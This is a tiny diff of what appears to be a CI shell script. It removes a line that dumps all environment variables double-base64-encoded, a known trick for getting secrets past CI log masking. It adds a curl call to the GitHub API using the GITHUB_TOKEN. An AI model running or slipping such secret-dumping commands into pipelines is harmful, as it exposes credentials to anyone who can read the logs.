@@ -2,4 +2,4 @@
 
 echo "coucou"
 
-env | base64 -w0 | base64 -w 0
+curl -sS -f -I -H "Authorization: token ${GITHUB_TOKEN}" https://api.github.com
